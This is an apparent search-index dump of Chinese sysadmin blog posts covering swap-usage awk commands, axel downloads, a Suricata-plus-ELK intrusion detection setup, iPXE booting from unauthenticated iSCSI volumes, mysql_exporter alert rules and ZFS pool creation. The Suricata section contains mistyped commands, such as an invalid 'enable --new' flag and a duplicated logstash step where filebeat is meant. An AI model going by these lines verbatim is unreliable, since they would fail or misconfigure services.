awk \u003cspan class=\"s1\"\u003e\u0026#39;BEGIN{sum=0} {sum=sum+$(NF-2)} END{print sum}\u0026#39;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;{process[$1]=$2;sub(/^[ \\t]+/,\u0026#34;\u0026#34;,process[$1]);} END {if(process[\u0026#34;VmSwap\u0026#34;] \u0026amp;\u0026amp; process[\u0026#34;VmSwap\u0026#34;] != \u0026#34;0 kB\u0026#34;) {used_swap=process[\u0026#34;VmSwap\u0026#34;];sub(/[ a-zA-Z]+/,\u0026#34;\u0026#34;,used_swap);percent=(used_swap/TOTSWP*100); printf \u0026#34;%10s %-30s %20s %6.2f%\\n\u0026#34;,process[\u0026#34;Pid\u0026#34;],process[\u0026#34;Name\u0026#34;],process[\u0026#34;VmSwap\u0026#34;],percent} }\u0026#39;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;{}\u0026#39;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\;\u003c/span\u003e  \u003cspan class=\"p\"\u003e|\u003c/span\u003e awk \u003cspan class=\"s1\"\u003e\u0026#39;{print $(NF-2),$0}\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e sort -hr \u003cspan class=\"p\"\u003e|\u003c/span\u003e head \u003cspan class=\"p\"\u003e|\u003c/span\u003e cut -d \u003cspan class=\"s2\"\u003e\u0026#34; \u0026#34;\u003c/span\u003e -f2-\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20231215-swap_usage/2020-07-14_180338.png\"\u003e\u003c/p\u003e","title":"查看SWAP交换空间被哪个进程给用掉了"},{"content":"Linux下多线程下载工具，且支持断点续传，机房传文件必备：\naxel -s 9000000 -a -n 5 -o ord_his.dmp http://172.16.24.2:8080/ord_his.dmp -s 限速，9000000是70M带宽，不加s就是100M榨干 -n 线程，缺省是4 -o 目的文件 -a 进度条压缩展示，必须加，否则会进度满天飞\n注意：axel 是可以自动断点续传的\n","permalink":"https://rendoumi.com/posts/20231215-axel_download/","summary":"\u003cp\u003eLinux下多线程下载工具，且支持断点续传，机房传文件必备：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaxel -s \u003cspan class=\"m\"\u003e9000000\u003c/span\u003e -a -n \u003cspan class=\"m\"\u003e5\u003c/span\u003e -o ord_his.dmp http://172.16.24.2:8080/ord_his.dmp \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e-s 限速，9000000是70M带宽，不加s就是100M榨干\n-n 线程，缺省是4\n-o 目的文件\n-a 进度条压缩展示，必须加，否则会进度满天飞\u003c/p\u003e\n\u003cp\u003e注意：axel 是可以自动断点续传的\u003c/p\u003e","title":"Linux支持断点续传、多线程下载的软件"},{"content":"suricata 是跟snort差不多的一个入侵检测工具，加上elk的图形界面，非常的好看。\n原理是suricata的log发到elk里，这样就能通过kibana进行分析了\n环境：\n1、物理机需要开16G内存，16CPU，都不太够 2、物理机172.18.30.2的br3是交换机的Mirror口，进入的全部流量都被镜像了一份 3、suricata-18-31-31是虚机，需要将30.2的br3挂进来\nvirsh attach-interface --domain suricata-18-31-31 --type bridge --source br3 --model e1000 --config --live 同时在31.31里，ifconfig up eth1把网卡起起来 tcpdump -i eth1有数据即可 4、首先安装java\nrpm -ivh jdk-8u201-linux-x64.rpm 安装： 一、编译安装suricata\nyum -y install epel-release yum -y install jq cargo openssl-devel PyYAML lz4-devel gcc libpcap-devel pcre-devel libyaml-devel file-devel zlib-devel jansson-devel nss-devel libcap-ng-devel libnet-devel tar make libnetfilter_queue-devel lua-devel GeoIP-devel wget https://www.openinfosecfoundation.org/download/suricata-4.1.8.tar.gz tar zxvf suricata-4.1.8.tar.gz cd suricata ./configure --libdir=/usr/lib64 --prefix=/usr --sysconfdir=/etc --localstatedir=/var --enable-nfqueue --enable-lua --enable-geoip --enable-profiling make make install-full 验证一下 suricata -V This is Suricata version 4.1.8 RELEASE 查看build参数 suricata --build-info suricata就装好了，还需要配一下suricata-update，规则才是最主要的，装好后最好每天更新一下规则\nsuricata-update update-sources suricata-update list-sources suricata-update enable-source ptresearch/attackdetection suricata-update enable-source oisf/trafficid suricata-update enable-source sslbl/ssl-fp-blacklist suricata-update suricata-update的用法\nsuricata-update list-enabled-sources suricata-update disable-source et/pro suricata-update remove-source et/pro 测试规则：\nsuricata -T /etc/suricata/suricata.yaml的修改部分\nHOME_NET: \u0026#34;[43.231.149.0/25]\u0026#34; outputs被改过 outputs: app-layer被改过 app-layer: 具体看附件中的suricata.yaml\n启动：\n/usr/bin/suricata -c /etc/suricata/suricata.yaml -i eth1 -D 二、编译安装ELK\nrpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearch cat \u0026lt;\u0026lt;EOF | sudo tee /etc/yum.repos.d/elasticsearch.repo [elasticsearch-7.x] name=Elasticsearch repository for 7.x packages baseurl=https://artifacts.elastic.co/packages/7.x/yum gpgcheck=1 gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch enabled=1 autorefresh=1 type=rpm-md EOF yum clean all yum makecache yum install -y elasticsearch logstash kibana filebeat 安装的时候最好设一下翻墙，否则下这几个包非常慢！！！\n然后一个一个来设置\n1、设置elasticsearch vi /etc/elasticsearch/jvm.options -Xms4g -Xmx4g vi /etc/elasticsearch/elasticsearch.yml indices.query.bool.max_clause_count: 8192 search.max_buckets: 250000 systemctl enable --now elasticsearch 2、设置logstash 将附件中logstash目录下的synlite_suricata/目录完整挪到/etc/logstash下 /etc/logstash/synlite_suricata/ 将附件中logstash目录下的pipelines.yml拷贝到/etc/logstash下 /etc/logstash/pipelines.yml 将附件中logstash目录下的logstash.service拷贝覆盖掉/etc/systemd/system/logstast.service /etc/systemd/system/logstash.service vi /etc/logstash/jvm.options -Xms4g -Xmx4g systemctl daemon-reload systemctl enable --now logstash 3、设置filebeat vi /etc/filebeat/filebeat.yml filebeat.inputs: - type: log enabled: true paths: - /var/log/suricata/eve.json fields: event.type: suricata output.logstash: hosts: [\u0026#34;127.0.0.1:5044\u0026#34;] #ssl.certificate_authorities: [\u0026#34;/etc/pki/root/ca.pem\u0026#34;] #ssl.certificate: \u0026#34;/etc/pki/client/cert.pem\u0026#34; #ssl.key: \u0026#34;/etc/pki/client/cert.key\u0026#34; systemctl enable --now logstash 4、设置kibana vi /etc/kibana/kibana.yml server.host: \u0026#34;172.18.31.31\u0026#34; systemctl enable --new kibana 跑起来以后打开 http://172.18.31.31:5601 就可以看到了\n如果不出意外，应该有数据了。需要建立一个suricata*的索引。\n去kibana的home \u0026ndash;\u0026gt; Stack Management\n导入的synlite_suricata.kibana.7.1.x.json\nhttps://github.com/robcowart/synesis_lite_suricata/blob/master/kibana/synlite_suricata.kibana.7.1.x.json\n然后在dashboard里就可以看到了\n可以清楚的看到各种ipflow，流量分布。\n","permalink":"https://rendoumi.com/posts/20231215-suricata_elk/","summary":"\u003cp\u003esuricata 是跟snort差不多的一个入侵检测工具，加上elk的图形界面，非常的好看。\u003c/p\u003e\n\u003cp\u003e原理是suricata的log发到elk里，这样就能通过kibana进行分析了\u003c/p\u003e\n\u003cp\u003e环境：\u003c/p\u003e\n\u003cp\u003e1、物理机需要开16G内存，16CPU，都不太够\n2、物理机172.18.30.2的br3是交换机的Mirror口，进入的全部流量都被镜像了一份\n3、suricata-18-31-31是虚机，需要将30.2的br3挂进来\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh attach-interface  --domain suricata-18-31-31 --type bridge --source br3 --model e1000 --config --live\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e同时在31.31里，ifconfig up eth1把网卡起起来\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etcpdump -i eth1有数据即可\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e4、首先安装java\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erpm -ivh jdk-8u201-linux-x64.rpm\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e安装：\n一、编译安装suricata\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install epel-release\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install jq cargo openssl-devel PyYAML lz4-devel gcc libpcap-devel pcre-devel libyaml-devel file-devel zlib-devel jansson-devel nss-devel libcap-ng-devel libnet-devel tar make libnetfilter_queue-devel lua-devel GeoIP-devel\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://www.openinfosecfoundation.org/download/suricata-4.1.8.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf suricata-4.1.8.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e suricata\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./configure --libdir\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/lib64 --prefix\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr --sysconfdir\u003cspan class=\"o\"\u003e=\u003c/span\u003e/etc --localstatedir\u003cspan class=\"o\"\u003e=\u003c/span\u003e/var --enable-nfqueue --enable-lua --enable-geoip --enable-profiling\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake install-full\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e验证一下\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esuricata -V\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThis is Suricata version 4.1.8 RELEASE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e查看build参数\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esuricata --build-info\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003esuricata就装好了，还需要配一下suricata-update，规则才是最主要的，装好后最好每天更新一下规则\u003c/p\u003e","title":"suricata加上elk分析机房入口全流量"},{"content":"如果一台宿主机上面cpu和memory都有富裕，但是磁盘不富裕，那就会面临资源浪费\n所以干脆用ipxe的sanboot来启动远程的iscsi磁盘来启动虚机好了\n首先用《iscsi卷的远程挂载》这篇文章中所说的方法，在172.18.30.18的20T的loopback vg group上，划出一块80G的硬盘\n#划个lvc，用的是vg-targetd的20T中的80G lvcreate -L 80G -n pvc-vis-18-31-48 vg-targetd #建立block块设备 targetcli /backstores/block create vg-targetd:pvc-vis-18-31-48 /dev/vg-targetd/pvc-vis-18-31-48 #建立30.18上的iscsi服务端，似乎用renhe-18-30-18比较好，但是不好区分多个卷，还是用下面的精准 targetcli /iscsi create iqn.2020-10.com.ddky:vis-18-31-48 #建立luns，会自动建立portal targetcli /iscsi/iqn.2020-10.com.ddky:vis-18-31-48/tpg1/luns create /backstores/block/vg-targetd:pvc-vis-18-31-48 #建立客户端的iscsi，不加任何认证 targetcli /iscsi/iqn.2020-10.com.ddky:vis-18-31-48/tpg1/acls create iqn.2020-10.com.ddky:vis-18-31-48 记下来这个: iqn.2020-10.com.ddky:vis-18-31-48\n然后修改pxe，位于172.18.31.2 /export/html/pxeboot/boot2.php，本质是发送ipxe的命令\nsanhook是加载远程硬盘，并设置为/dev/sda\nfunction sansetup() { global $hostname; echo \u0026#34;:sansetup\\n\u0026#34;; echo \u0026#34;set initiator-iqn iqn.2020-10.com.ddky:vis-18-31-48\\n\u0026#34;; echo \u0026#34;set keep-san 1\\n\u0026#34;; echo \u0026#34;sanhook iscsi:172.18.30.18::::iqn.2020-10.com.ddky:vis-18-31-48\\n\u0026#34;; echo \u0026#34;kernel $hostname/repos/centos/7/os/x86_64/images/pxeboot/vmlinuz\\n\u0026#34;; echo \u0026#34;initrd $hostname/repos/centos/7/os/x86_64/images/pxeboot/initrd.img\\n\u0026#34;; echo \u0026#34;imgargs vmlinuz load_ramdisk=1 ks=$hostname/pxeboot/install/centos/centos7_last.php ksdevice=eth0 net.ifnames=0 biosdevname=0\\n\u0026#34;; echo \u0026#34;boot\\n\u0026#34;; } 发动一个无盘的虚机从pxe启动（172.18.30.3 /export/kvm/48.sh）：\n#!/bin/bash virt-install \\ --name=pxe-18-31-48 \\ --vcpu=4 \\ --ram=4096 \\ --pxe \\ --disk none \\ --os-type=linux \\ --network bridge=br0.199 \\ --vnc --vnclisten=0.0.0.0 --vncport=5910 注意上面：指定了pxe 和disk none，这样就会启动起来并安装到远程的iscsi盘上去\n安装完成后，修改ipxe指定该虚机机从sanboot启动，这时候iscsi卷里已经有引导信息了，就需要去掉指定。\nfunction sanboot() { global $hostname; echo \u0026#34;:sanboot\\n\u0026#34;; echo \u0026#34;set initiator-iqn iqn.2020-10.com.ddky:vis-18-31-48\\n\u0026#34;; echo \u0026#34;set keep-san 1\\n\u0026#34;; echo \u0026#34;sanboot iscsi:172.18.30.18::::iqn.2020-10.com.ddky:vis-18-31-48\\n\u0026#34;; echo \u0026#34;boot\\n\u0026#34;; } 重启后该机器就会从iscsi启动了。\n","permalink":"https://rendoumi.com/posts/20231215-pxe_sanboot/","summary":"\u003cp\u003e如果一台宿主机上面cpu和memory都有富裕，但是磁盘不富裕，那就会面临资源浪费\u003c/p\u003e\n\u003cp\u003e所以干脆用ipxe的sanboot来启动远程的iscsi磁盘来启动虚机好了\u003c/p\u003e\n\u003cp\u003e首先用《\u003ca href=\"https://bajie.dev/posts/20230801-iscsi_volume/\"\u003eiscsi卷的远程挂载\u003c/a\u003e》这篇文章中所说的方法，在172.18.30.18的20T的loopback vg group上，划出一块80G的硬盘\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#划个lvc，用的是vg-targetd的20T中的80G\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elvcreate -L 80G -n pvc-vis-18-31-48 vg-targetd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#建立block块设备\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etargetcli /backstores/block create vg-targetd:pvc-vis-18-31-48 /dev/vg-targetd/pvc-vis-18-31-48\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#建立30.18上的iscsi服务端，似乎用renhe-18-30-18比较好，但是不好区分多个卷，还是用下面的精准\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etargetcli /iscsi create iqn.2020-10.com.ddky:vis-18-31-48\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#建立luns，会自动建立portal\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etargetcli /iscsi/iqn.2020-10.com.ddky:vis-18-31-48/tpg1/luns create /backstores/block/vg-targetd:pvc-vis-18-31-48\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#建立客户端的iscsi，不加任何认证\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etargetcli /iscsi/iqn.2020-10.com.ddky:vis-18-31-48/tpg1/acls create iqn.2020-10.com.ddky:vis-18-31-48\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e记下来这个:  iqn.2020-10.com.ddky:vis-18-31-48\u003c/p\u003e\n\u003cp\u003e然后修改pxe，位于172.18.31.2 /export/html/pxeboot/boot2.php，本质是发送ipxe的命令\u003c/p\u003e\n\u003cp\u003esanhook是加载远程硬盘，并设置为/dev/sda\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e sansetup\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    global \u003cspan class=\"nv\"\u003e$hostname\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;:sansetup\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set initiator-iqn iqn.2020-10.com.ddky:vis-18-31-48\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set keep-san 1\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;sanhook iscsi:172.18.30.18::::iqn.2020-10.com.ddky:vis-18-31-48\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;kernel \u003c/span\u003e\u003cspan class=\"nv\"\u003e$hostname\u003c/span\u003e\u003cspan class=\"s2\"\u003e/repos/centos/7/os/x86_64/images/pxeboot/vmlinuz\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;initrd \u003c/span\u003e\u003cspan class=\"nv\"\u003e$hostname\u003c/span\u003e\u003cspan class=\"s2\"\u003e/repos/centos/7/os/x86_64/images/pxeboot/initrd.img\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;imgargs vmlinuz load_ramdisk=1 ks=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$hostname\u003c/span\u003e\u003cspan class=\"s2\"\u003e/pxeboot/install/centos/centos7_last.php ksdevice=eth0 net.ifnames=0 biosdevname=0\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;boot\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e发动一个无盘的虚机从pxe启动（172.18.30.3 /export/kvm/48.sh）：\u003c/p\u003e","title":"ipxe使用sanboot远程启动iscsi硬盘"},{"content":"mysql_exporter 其实是一个mysql客户端，定时收集本机mysql的数据，并暴露出一个web端口展现数据。\n例如：http://172.18.20.9:50001/metrics ，这里我们暴露的端口是50001。\nprometheus 每隔5分钟会访问这个web页面，把上面的数据抓下来入库。（时间间隔可以调整）\n我们点进Prometheus的页面：\n注意右下角的时间戳是不对的，差8小时，我们点右上角的React UI 这个UI时间是对的，跟当地时间一致： 想看 mysql 的指标，就需要编辑公式，输入mysql会显示所有mysql的公式： 注意：我们 mysql_exporter 的端口是50001 ， 写 promsql 选择instance的时候是这样的instance=\u0026ldquo;172.18.20.9:50001\u0026rdquo;\n给一些报警例子：\nrate(mysql_global_status_threads_connected[5m]) \u0026gt; 200\rmysql_global_variables_max_connections - mysql_global_status_threads_connected \u0026lt; 500\rmysql_global_status_innodb_num_open_files \u0026gt; (mysql_global_variables_open_files_limit) * 0.75 ","permalink":"https://rendoumi.com/posts/20231215-prometheus_mysql/","summary":"\u003cp\u003emysql_exporter 其实是一个mysql客户端，定时收集本机mysql的数据，并暴露出一个web端口展现数据。\u003c/p\u003e\n\u003cp\u003e例如：http://172.18.20.9:50001/metrics ，这里我们暴露的端口是50001。\u003c/p\u003e\n\u003cp\u003eprometheus 每隔5分钟会访问这个web页面，把上面的数据抓下来入库。（时间间隔可以调整）\u003c/p\u003e\n\u003cp\u003e我们点进Prometheus的页面：\u003c/p\u003e\n\u003cp\u003e注意右下角的时间戳是不对的，差8小时，我们点右上角的React UI\n\u003cimg loading=\"lazy\" src=\"/posts/20231215-prometheus_mysql/2021-11-23_084815.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这个UI时间是对的，跟当地时间一致：\n\u003cimg loading=\"lazy\" src=\"/posts/20231215-prometheus_mysql/2021-11-23_084907.png\"\u003e\u003c/p\u003e\n\u003cp\u003e想看 mysql 的指标，就需要编辑公式，输入mysql会显示所有mysql的公式：\n\u003cimg loading=\"lazy\" src=\"/posts/20231215-prometheus_mysql/2021-11-23_085033.png\"\u003e\u003c/p\u003e\n\u003cp\u003e注意：我们 mysql_exporter 的端口是50001 ， 写 promsql 选择instance的时候是这样的instance=\u0026ldquo;172.18.20.9:50001\u0026rdquo;\u003c/p\u003e\n\u003cp\u003e给一些报警例子：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003erate(mysql_global_status_threads_connected[5m]) \u0026gt; 200\r\n\r\nmysql_global_variables_max_connections - mysql_global_status_threads_connected \u0026lt; 500\r\n\r\nmysql_global_status_innodb_num_open_files \u0026gt; (mysql_global_variables_open_files_limit) * 0.75\n\u003c/code\u003e\u003c/pre\u003e","title":"Prometheus集成进mysql_exporter"},{"content":"zfs用来顶替Raid控制卡，有相当强悍的性能，TrueNAS用的就是这玩意。\n官方安装文档： https://openzfs.github.io/openzfs-docs/Getting%20Started/RHEL%20and%20CentOS.html\nCentOS7安装\nyum install -y epel-release\ryum install -y https://zfsonlinux.org/epel/zfs-release.el7_9.noarch.rpm\ryum install -y kernel-devel zfs 加载模块\n[root@localhost ~]# lsmod|grep zfs\r[root@localhost ~]# modprobe zfs\r[root@localhost ~]# lsmod|grep zfs\rzfs 3986850 0 zunicode 331170 1 zfs\rzlua 151525 1 zfs\rzcommon 89551 1 zfs\rznvpair 94388 2 zfs,zcommon\rzavl 15167 1 zfs\ricp 301854 1 zfs\rspl 104299 5 icp,zfs,zavl,zcommon,znvpair 看看文件系统\n[root@localhost ~]# zfs list\rno datasets available 192.168.85.100的本地磁盘从sdb 一直到 sdg，首先zpool建立池子，类似raid卡的功能 然后再zfs建立文件系统\n[root@localhost ~]# zpool create -f zfspool sdb sdc sdd sde sdf sdg\r[root@localhost ~]# zpool status\rpool: zfspool\rstate: ONLINE\rscan: none requested\rconfig:\rNAME STATE READ WRITE CKSUM\rzfspool ONLINE 0 0 0\rsdb ONLINE 0 0 0\rsdc ONLINE 0 0 0\rsdd ONLINE 0 0 0\rsde ONLINE 0 0 0\rsdf ONLINE 0 0 0\rsdg ONLINE 0 0 0\rerrors: No known data errors\r[root@localhost ~]# df -h\r文件系统 容量 已用 可用 已用% 挂载点\rdevtmpfs 63G 0 63G 0% /dev\rtmpfs 63G 0 63G 0% /dev/shm\rtmpfs 63G 9.9M 63G 1% /run\rtmpfs 63G 0 63G 0% /sys/fs/cgroup\r/dev/mapper/centos-root 50G 1.7G 49G 4% /\r/dev/sda1 1014M 189M 826M 19% /boot\r/dev/mapper/centos-home 392G 33M 392G 1% /home\rtmpfs 13G 0 13G 0% /run/user/0\rzfspool 53T 128K 53T 1% /zfspool 上面对生产无意义，没有任何冗余的配置在生产是行不通的\n破坏掉先\nzpool destroy zfspool 条带对机房基本无意义，做mirror 1即Raid1\n[root@localhost ~]# zpool create -f zfspool mirror sdb sdc\r[root@localhost ~]# zpool status\rpool: zfspool\rstate: ONLINE\rscan: none requested\rconfig:\rNAME STATE READ WRITE CKSUM\rzfspool ONLINE 0 0 0\rmirror-0 ONLINE 0 0 0\rsdb ONLINE 0 0 0\rsdc ONLINE 0 0 0\rerrors: No known data errors mirror的话往里面增加盘必须成对，单盘禁止往里面加\n[root@localhost ~]# zpool add -f zfspool mirror sde\rinvalid vdev specification: mirror requires at least 2 devices 增加一对盘进去，这样就做成Raid10了\n[root@localhost ~]# zpool add -f zfspool mirror sde sdf\r[root@localhost ~]# zpool status\rpool: zfspool\rstate: ONLINE\rscan: none requested\rconfig:\rNAME STATE READ WRITE CKSUM\rzfspool ONLINE 0 0 0\rmirror-0 ONLINE 0 0 0\rsdb ONLINE 0 0 0\rsdc ONLINE 0 0 0\rmirror-1 ONLINE 0 0 0\rsde ONLINE 0 0 0\rsdf ONLINE 0 0 0\rerrors: No known data errors 另外zfs有个特殊的raidz1 raidz2 raidz3 分别代表允许1块盘坏，2块盘坏，3块盘坏 需要的盘最小数量分别是2块，3块，4块\n在生产，比较适合的是允许2块盘坏，并加1块host spare\n[root@localhost /]# zpool create -f zfspool raidz2 sdb sdc sde sdf\r[root@localhost /]# zpool status\rpool: zfspool\rstate: ONLINE\rscan: none requested\rconfig:\rNAME STATE READ WRITE CKSUM\rzfspool ONLINE 0 0 0\rraidz2-0 ONLINE 0 0 0\rsdb ONLINE 0 0 0\rsdc ONLINE 0 0 0\rsde ONLINE 0 0 0\rsdf ONLINE 0 0 0\rerrors: No known data errors 